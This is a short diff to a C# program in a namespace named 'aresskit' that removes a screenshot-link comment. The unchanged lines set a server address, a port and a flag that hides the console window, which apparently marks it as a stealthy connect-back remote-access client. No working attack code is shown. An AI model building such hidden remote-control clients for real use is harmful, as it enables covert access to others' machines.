@@ -5,7 +5,7 @@ using System.Reflection;
 namespace aresskit
 {
     class Program
-    {   // http://prntscr.com/grsrlu
+    {   
         const string server = "localhost";
         const int port = 9000;
         const bool hideConsole = true;
